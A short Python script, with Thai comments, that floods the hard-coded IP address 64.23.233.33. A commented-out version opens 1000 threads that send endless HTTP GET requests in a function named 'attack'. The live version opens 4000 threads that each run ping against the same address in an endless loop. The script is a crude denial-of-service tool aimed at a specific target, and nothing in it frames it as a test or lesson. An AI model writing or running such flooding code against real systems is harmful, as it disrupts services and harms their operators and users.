# import requests
# import threading

# target = "http://64.23.233.33"
# num_threads = 1000

# def attack():
#     while True:
#         try:
#             r = requests.get(target)
#             print(f"Status: {r.status_code}")
#         except Exception as e:
#             print(f"Error: {e}")

# for i in range(num_threads):
#     t = threading.Thread(target=attack)
#     t.daemon = True
#     t.start()

# input("Press Enter to stop...\n")
import os
import threading

target = "64.23.233.33"   # กำหนด IP หรือ hostname
num_threads = 4000       # จำนวนเธร็ดที่จะสร้าง

def ping():
    while True:
        try:
            os.system(f"ping -c 1 {target}")
        except Exception as e:
            print(f"Error: {e}")

for i in range(num_threads):
    t = threading.Thread(target=ping)
    t.daemon = True
    t.start()
try:
    while True:
        pass
except KeyboardInterrupt:
    print("Stopping all threads...")
